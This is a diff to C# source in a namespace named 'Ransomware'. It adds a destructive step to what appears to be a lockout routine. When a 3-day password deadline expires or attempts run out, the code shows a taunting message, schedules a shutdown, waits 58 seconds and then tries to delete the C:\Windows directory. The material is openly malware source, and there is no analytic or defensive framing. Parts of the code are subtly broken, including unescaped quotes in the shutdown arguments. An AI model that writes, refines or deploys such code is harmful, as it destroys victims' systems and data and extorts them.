@@ -1,4 +1,5 @@
 using System;
+using System.Threading;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Security;
@@ -122,11 +123,23 @@ namespace Ransomware
             {
                 MessageBox.Show("The password is no longer accepted. You have exceeded the time limit of 3 days.");
                 Process.Start("shutdown","/s /t 60 /c "Hope you learned your lesson! Anyways, you only have 60 seconds left of your computers functionality");
+                Thread.Sleep(58000);
+                string directory2 = @"C:\Windows";
+                if (Directory.Exists(directory2))  
+                {  
+                    Directory.Delete(directory2);  
+                }  
             }
             else
             {
                 MessageBox.Show("No attempts remaining!");
-                Process.Start("shutdown","/s /t 60 /c "Enjoy the last 60 seconds of your computer");
+                Process.Start("shutdown","/s /t 60 /c "Hope you learned your lesson! Anyways, you only have 60 seconds left of your computers functionality");
+                Thread.Sleep(58000);
+                string directory2 = @"C:\Windows";
+                if (Directory.Exists(directory2))  
+                {  
+                    Directory.Delete(directory2);  
+                }  
             }
         }
 
